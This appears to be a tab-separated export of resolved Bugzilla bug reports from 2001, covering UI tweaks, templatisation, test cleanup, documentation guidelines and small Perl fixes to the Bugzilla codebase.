101875%TAB%1001526264%TAB%36180%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Query/Bug List%TAB%component column should be after product column in query results%TAB%component column should be after product column in query resultsIf you have the Component and Product columns turned on in the bug query results listing, the Component column comes before the Product column.  This seems counter-intuitive to me since Products contain Components, not the other way around.  If you have a list of bugs with many product/component combinations and you are visually scanning through looking for bugs for a particular product/component your eyes have to follow down the Product column...then move left to check the Component column. This causes a visual flow problem since most everyone reads from left to right, not right to left. Hope I haven't over explained the problem :-)
102032%TAB%1001594372%TAB%15368%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General,Testing Suite%TAB%Fix tinderbox test errors and warnings%TAB%Fix tinderbox test errors and warningsWe need to fix the test errors and warnings so that testing can be enabled  by default. Patch to fix some of these errors is coming.
102141%TAB%1001654659%TAB%36269%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%When changing a bug the Product: list has options the user doesn't have access to.,[security] When changing a bug the Product: list has options the user doesn't have access to.%TAB%When changing a bug the Product: list has options the user doesn't have access to.,[security] When changing a bug the Product: list has options the user doesn't have access to.If a bug is created in the product Foo, a user with Foo Bug Access will be able  to see other products in the Product pulldown menu in show_bug.cgi.  I can  reproduce it by doing the following:  1. Create a user Alice who has only Foo Bugs Access, and no other permissions  checked. 2. Alice submits a bug for the Foo product. 3. Alice views the bug at show_bug.cgi 4. Alice selects the Product pulldown menu (normally used to change which  product a bug belongs to) and sees that products Bar and Baz also exist.  Instead, Bugzilla should only display products that Alice has access to.  In  this case the only Foo should be displayed.
102424%TAB%1001825005%TAB%32335%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla Helper,Bugzilla-General%TAB%Evangelism component needs to be updated to Tech Evangelism product%TAB%Evangelism component needs to be updated to Tech Evangelism productLine 145:   - then these are not bugs in Mozilla. Please file bugs in the Evangelism component, + then these are not bugs in Mozilla. Please file bugs in the Tech Evangelism product,
102429%TAB%1001830554%TAB%29582%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla Helper,Bugzilla-General%TAB%Bugzilla helper doesn't like Tech Evangelism components.%TAB%Bugzilla helper doesn't like Tech Evangelism components.Steps to reproduce:  Use the bugzilla helper form to file a bug on the Tech Evangelism product.  Actual results:  Possible bug database corruption has been detected. Please send mail to endico@mozilla.org with details of what you were doing when this message appeared. Thank you.   src = African Asian English: Non-US English: US Europe: Central Europe: East Europe: West Middle Eastern Pacific Islands The Americas default = Central Europe  Expected results:  New bug page with fields prefilled.
102487%TAB%1001889977%TAB%33763%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%product-change page appears even if i don't write a comment%TAB%product-change page appears even if i don't write a commentI tried to move bug 101258 to the evangelism product without giving a comment.  (My previous comment had been "Reopening, will send to evangelism.")  I got a page asking me to make sure the target milestone and version fields were correct, and *then* I was told that the change couldn't go through because I didn't include a comment.  I'm leaving the severity at "normal" because even though this doesn't cause a lot of problems, it does make Bugzilla look stupid.
102622%TAB%1001947582%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla-General%TAB%showdependencygraph.cgi creates over-complex graphs,Dependency graphs should be able to be limited by depth,Dependency graphs should be able to be limited by relationship%TAB%showdependencygraph.cgi creates over-complex graphs,Dependency graphs should be able to be limited by depth,Dependency graphs should be able to be limited by relationshipshowdependencygraph.cgi creates graphs containing any bug with any relationship to the bug whose graph is being requested.  In some cases this means that Bugzilla generates a webdot file with thousands of dependencies, which is too many for webdot to parse, so showdependencygraph.cgi returns a page that hangs for five minutes and then times out waiting for the graph image to be displayed.  showdependencygraph.cgi should provide options for limiting the level of recursion or other mechanisms to make it usable with bugs that have a large number of dependencies.  It could use the same logic used by showdependencytree.cgi  to limit the number of bugs it displays.
102648%TAB%1001957303%TAB%31219%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Creating/Changing Bugs%TAB%Bug pages should include ACCESSKEY,Show_bug should include ACCESSKEY%TAB%Bug pages should include ACCESSKEY,Show_bug should include ACCESSKEYACCESSKEY allows users to access links, buttons, and form elements through hotkeys (such as Alt-ACCESSKEY on PC or Ctrl-ACCESSKEY on Max, where ACCESSKEY can be any single character).  Bug 56701 makes a good point that ACCESSKEYs are largely useless without a visual indicator. However, that primarily applies to sites that the user doesn't visit often. With intranets (or Bugzilla) users can simply be told about the ACCESSKEYs manually, either through extra text on the webpage, or through a glossary page.  ===== As for specifics, here're just a few ideas for ACCESSKEY asssignments:  Product-field: ACCESSKEY-r (I feel Platform is more deserving of "p") Component-field: ACCESSKEY-o (since "c" is taken) QA-field: ACCESSKEY-q URL-field: ACCESSKEY-u Summary-field: ACCESSKEY-s Status-whiteboard-field: ACCESSKEY-t (or "ACCESSKEY-w"?), since Summary has "s" Keywords-field: ACCESSKEY-k Depends-on-field: ACCESSKEY-d Blocks-field: ACCESSKEY-b Additional-comments-field: ACCESSKEY-a  Platform-field: ACCESSKEY-p OS-field: ACCESSKEY-s? (it looks like "o" is already Component) Version-field: ACCESSKEY-v Priority-field: ACCESSKEY-i (since "p" is Platform and "r" is Product) Severity-field: ACCESSKEY-e? (since "s" is already Summary) Target-milestone-field: ACCESSKEY-t Add-CC-field: ACCESSKEY-c Commit-button: ACCESSKEY-m? (since "c" is already CC and "o" is already Component) ====  Well, those are just a few ideas.
102658%TAB%1001964906%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Documentation%TAB%Hacker's Guide - Taint Mode%TAB%Hacker's Guide - Taint ModeAll new cgis should run in taint mode (Perl taint and DBI taint), and existing cgis that run in taint mode must not have these turned off.
102659%TAB%1001965435%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Documentation%TAB%Hacker's Guide - Unified Patches%TAB%Hacker's Guide - Unified PatchesAll patches submitted for inclusion in Bugzilla should be unified.  They should also be against CVS (if possible).  This will result in your patch being accepted quicker and helping you quicker.
103121%TAB%1002174841%TAB%5898%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%User Interface%TAB%editusers.cgi needs an Add link on the query page.%TAB%editusers.cgi needs an Add link on the query page.Currently when you want to add a user you must perform some arbitrary query first to be able to access the Add a new user link. It should be on each page generated by editusers.cgi.
103274%TAB%1002240083%TAB%15150%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Query/Bug List%TAB%Buglist Navigation Bar & new <link> tags incorrect if viewing a bug not in the list,Site Navigation Bar incorrect if viewing a bug not in the list%TAB%Buglist Navigation Bar & new <link> tags incorrect if viewing a bug not in the list,Site Navigation Bar incorrect if viewing a bug not in the listI like the great new 'Site Navigation Bar' - thanks to all involved at Mozilla for that, and also the way that Bugzilla uses it, but I notice that sometimes it (and also the old buglist navigation bar) get confused...  i.e.  If you have a buglist open, but then visit a bug not in the list (e.g. from a bookmark, or by clicking on a link in an email etc.), then the navigation bar and the links in the 'Site Navigation Bar' try and work, and next/prev/first/last links are displayed, but you are not really still in the buglist are you, so I don't think the links should exist, should they?  2 possible solutions are:  1) Add a 'nav-buglist' parameter to all the URLs in a buglist, and to all the URLs in the navigation bars, and only use the buglist navigation bar + site navigation bar if this parameter exists. (And in so doing stop using the buglist cookie, and so maybe allowing multiple buglists to work?)  2) In showbug.cgi, check when generating the buglist navigation bar and the Site Navigation Bar links if the bug being shown is actually part of the list, and don't show or enable the links if it isn't.
103439%TAB%1002317916%TAB%8444%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%User Interface%TAB%`Login' should be `Log In',Correctly use noun/verb forms of Login/Log In and Logout/Log Out where appropriate%TAB%`Login' should be `Log In',Correctly use noun/verb forms of Login/Log In and Logout/Log Out where appropriateBuild: bugzilla.mozilla.org  To reproduce: 1.  Delete your Bugzilla cookies. 2.  Make a change to a bug.  What you see: *   `Login' *   `Login' *   `Login'  What you should see: *   `Log in to Bugzilla' *   `Log in' *   `Log In'  Login is a noun. This page is asking you to log in, which is a verb.
103523%TAB%1002406768%TAB%11608%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Query/Bug List%TAB%bug list should be one table (instead of being split every 200 bugs),bug list table should not be split every 200 bugs,bug list table should not be split every 100 bugs,don't split bug list table every 100 bugs for new browsers,don't split buglist table every 100 bugs for new browsers%TAB%bug list should be one table (instead of being split every 200 bugs),bug list table should not be split every 200 bugs,bug list table should not be split every 100 bugs,don't split bug list table every 100 bugs for new browsers,don't split buglist table every 100 bugs for new browsersThe bug list table should not be split every 200 bugs.  This causes several  problems:  - It looks ugly to have the column widths change in the middle of what is  conceptually one table.  - I can't select an entire column in order to generate statistics.  For  example, I might want to select the reporter column of the unconfirmed list,  and then use `sort', `uniq --count', and `sort -g' in order to get a list like   5 plairo@cs.com   7 tuscontester1@netscape.net  71 tuscontester2@netscape.net <http://www.gnu.org/manual/textutils/html_chapter/textutils_7.html> (Note: I also run into bug 103522 when I try to do this.)  - I can't use the sort table bookmarklet effectively, so I have to ask the  server to do the sort and wait for the results to be re-sent. <http://www.squarefree.com/bookmarklets/pagedata.html#sort_table>
103554%TAB%1002437960%TAB%17856%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%CGI.pl: PutHeader and GetCommandMenu  should output correct HTML%TAB%CGI.pl: PutHeader and GetCommandMenu  should output correct HTMLEvery page bugzilla renders uses these two methods to output HTML, and at the moment the HTML is broken in accord to W3C HTML4.01 Transitional, which is AFAICT a worthy target. I agree this is a temporary fix, but since XHTML is still a ways off (and this is a step towards it) I'd like to fix these two functions and get the W3C validator parsing our pages. This bug, when fixed, allows bug 83058 to output correct HTML.
103592%TAB%1002459875%TAB%5003%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Query/Bug List%TAB%truncate or wrap long email addresses in buglist.cgi%TAB%truncate or wrap long email addresses in buglist.cgisplit off from bug 62729  There are several b.m.o users with email addresses in excess of 30 characters. In cases where the reporter, qa contact or assignee are visible and of such great length then all the other columns are shifted far to the right causing a horizontal scroll and making bug number and summary not visible at the same time. One solution to this problem would be to truncate or wrap email addresses at some reasonable width. I can't ask these folks to get a new email address but I wouldn't feel too bad asking them to abbreviate a long realname.   For a testcase query b.m.o for bugs assigned to  Roland.Mainz@informatik.med.uni-giessen.de
103636%TAB%1002510773%TAB%18727%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Creating/Changing Bugs%TAB%Support for specifying a date on which a bug is expected to be resolved missing,Support for specifying a date on which a bug is expected to be resolved,Support for specifying a date on which a bug is expected to be resolved ('Deadline' field)%TAB%Support for specifying a date on which a bug is expected to be resolved missing,Support for specifying a date on which a bug is expected to be resolved,Support for specifying a date on which a bug is expected to be resolved ('Deadline' field)This patch attached to this trouble ticket allows to specify a date a bug is expected to be resolved. Group bits can used to restrict access to this field no access, read-only access, read/write access). This concerns not only the bug form, but also the activities log and the mail sent out when the trouble ticket changes. A tiny script whineatoverdue.pl sends a email to tickets assignee if the bug has not been resolved in time. The feature can be disabled in the parameter section.
103664%TAB%1002528436%TAB%33620%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General,Testing Suite%TAB%Clean up tests to use 'use strict' and TEST_VERBOSE%TAB%Clean up tests to use 'use strict' and TEST_VERBOSEThe soon-to-be-attached patch will do the following:  1. Change use 'VERBOSE' environment variable when running tests to use    'TEST_VERBOSE' instead.  This is what ExtUtils::MakeMaker uses when    generating a Makefile from Makefile.PL.  The runtests.sh script and    the test scripts should do the same.  2. Add 'use strict;' to all test scripts and clean up undeclared    variables.  3. Add $verbose variable to t/002goodperl.t in case it is needed later.  4. Remove "sillyness" from t/001compile.t for $warnings variable    (which really should have been %warnings).  5. Clean up package name of t/Support/Systemexec.pm from 'Systemexec'    to 'Support::Systemexec' and fix t/003safesys.t to use the proper    syntax for the module.  6. Fix regex in t/003safesys.t when testing for error messages from     improper exec() calls.
103773%TAB%1002557975%TAB%17444%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla Helper,Bugzilla-General%TAB%Entering URL into bugzilla helper causes alert dialog to be shown on submit%TAB%Entering URL into bugzilla helper causes alert dialog to be shown on submitFill in the bugzilla helper form and enter the URL as http://dmoz.org/  When you submit, you get an alert dialog box appearing saying:  dmoz.org/  with no explanation. The enter_bug.cgi comes up ok in a new window, but this is not immediately obvious if you run moz maximised, because the new window appears in the background (presumably because of the dialog box). In case this is a browser bug, build id is 2001100808
103778%TAB%1002562952%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Query/Bug List%TAB%templatize buglist.cgi%TAB%templatize buglist.cgibuglist.cgi should be templatized.
103794%TAB%1002570443%TAB%21643%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla: Other moz.org Issues,User Interface%TAB%No link to http://bugzilla.mozilla.org/ on bug pages,No link to urlbase on bug footer,No link to home page/index page/urlbase on bug footer%TAB%No link to http://bugzilla.mozilla.org/ on bug pages,No link to urlbase on bug footer,No link to home page/index page/urlbase on bug footerIt would be really nice to have a link back to the main bugzilla.mozilla.org web page from the Bugzilla bugs page. Since there's no obviousl link, I always have the impulse to click the Mozilla.org banner at the top of the page, which obviously takes me back to www.mozilla.org...
103953%TAB%1002638540%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Creating/Changing Bugs%TAB%Templatise enter_bug.cgi%TAB%Templatise enter_bug.cgiEnter_bug.cgi should be templatised, as the first step towards making the Bugzilla Helper merely another template for it, or to share the back end.
104025%TAB%1002684124%TAB%13272%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%User Interface%TAB%Need a "results-only" mode to embed buglist via an IFRAME%TAB%Need a "results-only" mode to embed buglist via an IFRAMEThere should be a way to embed a buglist in an html page via an IFRAME. Currently, this is not really practical: Each buglist page contains a lot of crap that isn't really needed: page header, footer, Next/Prev/etc. links, a quip, the current date, and more. There should be a way to turn off these unnecessary page elements: one at a time: &header=no&footer=no&count=no&buglist_links=no&... and/or with a single switch like tinderbox has: &nocrap=1
104049%TAB%1002698290%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla-General%TAB%Change "ASSIGNED" status to "ACCEPTED",Change "ASSIGNED" status to "INPROGRESS"%TAB%Change "ASSIGNED" status to "ACCEPTED",Change "ASSIGNED" status to "INPROGRESS"There is an incongruence between the ASSIGNED status and the assignee field.  "Assigning" or "reassigning" a bug does not change its status to "ASSIGNED", and bugs are always assigned to someone no matter what their status.  The solution to this problem is to change the terminology for one of these fields, and the status field is the likely candidate for revision since we already use a different terminology for it: we say that a bug gets "accepted" when its status changes to "ASSIGNED".
104065%TAB%1002702701%TAB%36722%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%uninitialized string in "process_bug.cgi" line 92%TAB%uninitialized string in "process_bug.cgi" line 92(W uninitialized) An undefined value was used as if it were already defined.   It was     interpreted as a "" or a 0, but maybe it was a mistake.  To suppress this     warning assign a defined value to your variables.      [Wed Oct 10 11:24:39 2001] C:\bugzilla-2.14\process_bug.cgi: Use of  uninitialized value in string ne at C:\bugzilla-2.14\process_bug.cgi line 92. Content-type: text/html
104082%TAB%1002710514%TAB%5490%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Creating/Changing Bugs%TAB%<link> navigation missing after submitting changes%TAB%<link> navigation missing after submitting changesSteps to reproduce: 1) Turn the Site Navigation Bar on in Mozilla 2) Make a query that produces a bug list 3) Click a bug link 4) Notice the active bug list navigation buttons in the Site Navigation Bar. 5) Submit a change to the bug. 6) Take a look at the Site Navigation Bar  Actual results: No <link> navigation on the submission result page.  Expected results: Expected the submission result page to have similar <link> navigation features as the normal bug pages.
104105%TAB%1002716105%TAB%4030%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%User Interface%TAB%Not logged in page should indicate you may need to create account%TAB%Not logged in page should indicate you may need to create accountScenario that just happened to me: I got a bug report in email, I filed a bug and told the reporter to go the bug page and add himself to Cc. He tried that, but since he has no Bugzilla account (and was obviously not logged in) Bugzilla asked him to login first. The page also offered him the possibility of emailing him his password if he had forgotten it.   There was no indication that he might need to create a new account if he did not have one, nor was there any indication how he could create the account.
104177%TAB%1002745888%TAB%7978%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%typo in CGI.pl breaks keywords (editkeywords.cgi) link in footer%TAB%typo in CGI.pl breaks keywords (editkeywords.cgi) link in footerIn current CVS in CGI.pl in sub GetCommandMenu          if (UserInGroup("editkeywords")) {             $html .= ", <a href=\"editkeywords\".cgi>keywords</a>\n";         } Should be          if (UserInGroup("editkeywords")) {             $html .= ", <a href=\"editkeywords.cgi\">keywords</a>\n";         }
104180%TAB%1002747587%TAB%7978%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%User Interface%TAB%preset query footer broken for named queries containing spaces%TAB%preset query footer broken for named queries containing spacesThis is my fault, too. Sorry, HTML compliance fixes. Okay, let me put you up to the decision:  Originally, we used <NOBR> to wrapped around the bug name. This worked fine, but simply wasn't HTML compliant. To change this, there are two options (that I can see):  a) Make space-separated names breakable, meaning they can wrap. b) Substitute space for &nbsp;  I chose the second option, but didn't realize the problem it would cause in the receiving end. To fix that, you can apply this fix:  --- buglist.cgi 2001/10/05 22:20:33 1.144 +++ buglist.cgi 2001/10/11 19:06:51 @@ -816,7 +816,9 @@   CMD: for ($::FORM{'cmdtype'}) {      /^runnamed$/ && do { -        $::buffer = LookupNamedQuery($::FORM{"namedcmd"}); +        my $namedcmd = $::FORM{"namedcmd"}; +        $namedcmd =~ s/&nbsp;/ /g; +        $::buffer = LookupNamedQuery($namedcmd);          $::querytitle = "Bug List: $::FORM{'namedcmd'}";          ProcessFormFields($::buffer);          last CMD;    But I am unsure this is the correct fix. I can remove the &nbsp;-ifying if we decide it's the best (I will _not_ break HTML compliance, however, so NOBR is out of the question).
104247%TAB%1002795958%TAB%17856%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%User Interface%TAB%buglist.cgi colorization is broken%TAB%buglist.cgi colorization is brokenThis is a stopgap, but the fact that broken code is checked in should be fixed. I know this will be impacted by bug 69654 but that doesn't look like it's going to be implemented before templates and HTML compliancy, so let's fix this first.
104261%TAB%1002801157%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs,attachment and request management%TAB%attachment.cgi doesn't look in "template/custom" directory%TAB%attachment.cgi doesn't look in "template/custom" directoryattachment.cgi doesn't have "template/custom" in its path, so custom templates do not work with it.  This should be fixed.
104340%TAB%1002838802%TAB%13272%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%User Interface%TAB%showdependencytree.cgi: toolbar UI design%TAB%showdependencytree.cgi: toolbar UI designI'd prefer the following UI:  [Hide Resolved] Max depth: [1] [<] [_3_] [>] [Unlimited]  You don't need a submit button for the number field because you can submit it with just pressing return. Maybe you can even completely leave out the text input field:  [Hide Resolved] Max depth: [1] [<] [>] [Unlimited]  Let the discussion begin.
104521%TAB%1002904890%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Creating/Changing Bugs,attachment and request management%TAB%remove old attachment interface in favor of attachment tracker%TAB%remove old attachment interface in favor of attachment trackerThe so-called "attachment tracker" interface is really a generalized system for handling attachments, especially once bug 98602 gets checked in.  We should remove the old interface to attachments (createattachment.cgi, showattachment.cgi) and replace it with the attachment tracker. 
104548%TAB%1002929214%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Documentation,bugzilla.org%TAB%Hackers' Guide - Run tests.%TAB%Hackers' Guide - Run tests.Each patch should be checked against the tests before submitted and also before being checked in.  Also briefly explain the rationale behind all the current tests, move down the interpolating regexp comment into this section as it is now checked (I think).  AIUI the tests all pass now so we can proceed with this immediately.
104589%TAB%1002960935%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%User closing window should not terminate Bugzilla scripts.,User closing window should not terminate Bugzilla scripts (quick fix for 2.16)%TAB%User closing window should not terminate Bugzilla scripts.,User closing window should not terminate Bugzilla scripts (quick fix for 2.16)Apparently if the user shuts down their window Bugzilla scripts automatically die.  This is not acceptable.  Increasingly problems are being pinned on this issue.  Apparently this only happens when you do a print - hopefully that's true.  In this case templatisation would help greatly.  However, we'd lose incremental output for process_bug.cgi, which would be useful, so I would prefer to be able to use template fragments there and use another technique where necessary.  Gerv fingered this for part of bug #99788, but I'm not sure that's correct because it supposedly requires prints in between.  Dave has seen before that when you quit a bulk change it stops part way through.  That was good in the particular circumstance, but I'd say it isn't in general.  I have _confirmed_ that this is at least one (and maybe the only) circumstance where emails fail to get sent out.  This can happen when you change dependencies and the emails for the other side doesn't get sent out.  So what to do?  For some things this behaviour is desirable (sanity check, where incremental is good as well), and with some things templates are enough (where incremental output is not needed), but it would be nice to have a middle ground where this doesn't occur and we can have incremental output (for process_bug.cgi).
104600%TAB%1002963400%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Installation & Upgrading,User Interface%TAB%Automatically create template/custom.,template/custom gets pruned on cvs update -dP%TAB%Automatically create template/custom.,template/custom gets pruned on cvs update -dPThe template/custom directory shouldn't be in CVS, it should be created automatically by checksetup.pl.
104652%TAB%1002991483%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%Missing dependency tree information%TAB%Missing dependency tree informationhttp://bugzilla.mozilla.org/showdependencytree.cgi?id=103705  does not correctly show the dependencies of http://bugzilla.mozilla.org/show_bug.cgi?id=100107 .   In that tree, bug 100107 appears to have no dependencies when, in fact, it has a large number. This is somewhat annoying, as it makes it harder to track Mozilla 1.0 bugs.
104680%TAB%1003025104%TAB%13272%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla-General%TAB%Bugzilla development: work queue in irc topic is suboptimal%TAB%Bugzilla development: work queue in irc topic is suboptimalManaging the request queues in the topic of the #mozwebtools IRC channel has several shortcomings: - it makes the topic long, and only works for short queues - adding a bug to the queue requires changing the long topic, which can be  considered difficult by someone who is not a hardcore irc user - looking up what the bugs are about requires a copy/paste of the bug list  from the topic into the search textbox - you can't query for bugs with the review keyword that don't already appear in the topic queues - there is no place to record the reason why you nominate a bug/review to be processed now (and thus prioritized over other bugs with the same keywords)  There are probably more. Maybe some of these problems can be solved by using a "request tracker".
105365%TAB%1003344961%TAB%4897%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Documentation%TAB%Hacker's guide should be in SGML%TAB%Hacker's guide should be in SGMLCurrently, the hacker's guide is just inside a <literlayout/> tag.  This is not good :)
105366%TAB%1003345156%TAB%17698%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Installation & Upgrading,Documentation%TAB%webserveruser in localconfig, checksetup.pl,Provide suexec documentation%TAB%webserveruser in localconfig, checksetup.pl,Provide suexec documentationIf you are using Bugzilla with Apache's suexec feature, checksetup.pl will break bugzilla by resetting ownership of files to root (if checksetup.pl is run as root). This can be rectified by adding a webserveruser parameter to localconfig.
105472%TAB%1003398329%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Administration%TAB%no mention that expectbigqueries unnecessary with mysql >=3.23.2%TAB%no mention that expectbigqueries unnecessary with mysql >=3.23.2The MySQL documentation says that setting the SQL_BIG_TABLES option is only necessary with versions of MySQL older than 3.23.2.  http://www.mysql.com/doc/M/e/Memory_use.html  Installations with newer versions of MySQL have no need to set this option and shouldn't since it slows down queries, but there is no mention of this in the explanation of the "expectbigqueries" parameter.  The explanation of this parameter should say something like "Setting this parameter is only necessary if you are running a version of MySQL older than 3.23.2."
105480%TAB%1003401117%TAB%36800%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Administration%TAB%Make better use of fielddefs TABLE when displaying errors%TAB%Make better use of fielddefs TABLE when displaying errorsWith strictvaluechecks enabled, rather than displaying sensative database column names to the user upon certain errors, lets use the fieldefs table to display an appropriate name.  When strictvaluechecks is on (and the make_popup changes from bug#95967), and the user neglects to select a platform, OS, or severity, and the select "Commit", they would be presented with complaints about rep_platform, op_sys, and bug_status.  The user should never see database information, only information stored in the database.  Therefore, I propose changing CGI::CheckFormField(\%$;\@) to use the fielddefs TABLE to lookup the display'able name for $fieldname.    I haven't gone through and examined if table/column names are displayed to the user elsewhere.  If other instances are found (not through CheckFormField()), they should be modified as well.  Suggested patch soon to follow...
105488%TAB%1003403400%TAB%36800%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Administration%TAB%Bugzilla error messages as installation definable parameters%TAB%Bugzilla error messages as installation definable parametersThis is a real wishlist type bug, so here it goes...  Ideally, it would be nice to have all error messages displayed by bugilla as parameters configurable in the editparams.cgi interface.  For example, my installation uses LDAP for authentication and my users would need to see web pages to goto to change/create their LDAP passwords.  Currently, I have to edit the source and keep track of the changes as I update from CVS.  It would be nice for all error messages to have an numeric ID.  Then the associated text with the error could be parameterized so that the admin can change the text (add html/links) to suite the installation.  The errormessage ID would not be configurable and would be tied to the documentation so the user could seek further explanation regarding the error.    So when the user commits a bug without select a platform...the code would display...  Error #46: Param('error46text') Granted this would be a pain to parameterize all the error messages, and change all the spots that display an Error msg, but it would make changing them easier and documentation easier.
105724%TAB%1003493279%TAB%6793%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Query/Bug List%TAB%javascript strict warnings in buglist.cgi%TAB%javascript strict warnings in buglist.cgiWarning: assignment to undeclared variable numelements Source File: http://bugzilla.mozilla.org/buglist.cgi?bug_status=UNCONFIRMED&bug_status=NEW&bug_status=ASSIGNED&bug_status=REOPENED&bug_status=RESOLVED&bug_status=VERIFIED&bug_status=CLOSED&emailtype1=substring&emailassigned_to1=1&emailtype2=substring&emailreporter2=1&bugidtype=include&chfieldto=Now&short_desc=javascript+strict+warnings&short_desc_type=substring&long_desc_type=substring&bug_file_loc_type=substring&status_whiteboard_type=substring&keywords_type=anywords&field0-0-0=noop&type0-0-0=noop&order=bugs.short_desc%2C%20bugs.bug_id&tweak=1 Line: 246
105773%TAB%1003507760%TAB%34176%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%User Interface%TAB%Email addresses in cc list should be sorted case insensitively%TAB%Email addresses in cc list should be sorted case insensitivelyLook at bug 11632 - the first five email addresses in the CC: list begins with  A, E, P, S and V! This happens because Bugzilla treats the email addresses as  case sensitive values when sorting them, and some people seem to like putting  capital letters in their email addresses.
105812%TAB%1003556837%TAB%36800%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla-General,User Interface%TAB%Rename "Components" link in sub GetCommandMenu() to "Products"%TAB%Rename "Components" link in sub GetCommandMenu() to "Products"The "components" link displayed in the page footer for privileged users is misleading.  When you click on the link it takes you to editproducts.cgi where the page title is "Select product" and the page has a list of products (no mention of components here).  When you select a product, you can see the "Edit components" link however that is just one part of the whole "Edit product" interface.  I proposed that the "components" link should be renamed to "products" in the CGI::GetCommandMenu().  I'm a stickler for consistency.           if (UserInGroup("editcomponents")) { -            $html .= ", <a href=\"editproducts.cgi\">components</a>\n"; -            $html .= ", <a href=\"editattachstatuses.cgi\"> -              attachment&nbsp;statuses</a>\n" if Param('useattachmenttracker'); +            $html .= ", <a href=editproducts.cgi>products</a>"; +            $html .= ", <a href=editattachstatuses.cgi><NOBR>attachment statuses</NOBR></a>" +              if Param('useattachmenttracker');          }
105877%TAB%1003614186%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Documentation%TAB%Backup & check for modifications before upgrade.%TAB%Backup & check for modifications before upgrade.The upgrading section should mention backing up before each upgrade as good practice as always.  It should probably also mention overwriting the code is only appropriate if you haven't made mods to the code (as many ppl do).  Admins who've inherited a system might not be aware of this.
105879%TAB%1003614892%TAB%4412%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla-General%TAB%Footer links have double pipe.%TAB%Footer links have double pipe.here are two pipe characters after "Sanity Check".  The relevant code is:  if (UserInGroup("tweakparams")) {     $html .= "| <a href=\"sanitycheck.cgi\">Sanity&nbsp;check</a> |\n"; }  $html .= qq{  | <a href="relogin.cgi">Log&nbsp;out</a> $::COOKIE{'Bugzilla_login'}
105960%TAB%1003676566%TAB%5603%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Query/Bug List%TAB%xml.cgi and other future xml pages generate invalid XML%TAB%xml.cgi and other future xml pages generate invalid XMLBecause xml.cgi basically hand crafts xml instead of using the standard perl XML libraries, it doesn't escape/encode umlauts (for example), so the XML it creates is invalid. This means that sane XML libraries looking to parse the code are... well, displeased.   Because we are moving towards templates for all data output (not just xml.cgi), it seems unlikely that this problem is going to be solved the 'correct' way- i.e., by using the perl XML libraries to create properly encoded XML.    So... I'm not entirely sure that there is any elegant solution to this, except maybe to provide a 'encode_this_like_XML_likes()' function that can be called iff xml is chosen as the output format. Not sure how that would work, though. But it is a problem, and will continue to be if people want to use standard system libraries (on both linux and windows) to create interaction with bugzilla.
106003%TAB%1003722490%TAB%34865%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%User Interface%TAB%Dependency tree does not show the summary of the root bug%TAB%Dependency tree does not show the summary of the root bugI need to see the summary of the root bug at the top of a dependence tree. I  can see the bug number, but I cannot yet remember every bug number in the  database...  Also, for printing, it would be nice to be able to see what bug the dependency  tree concerns.  The summary could for instance be placed in a table cell to the right  of "Dependency tree     Bug xxxx" just before "Bugs that bug xxxx depends on".
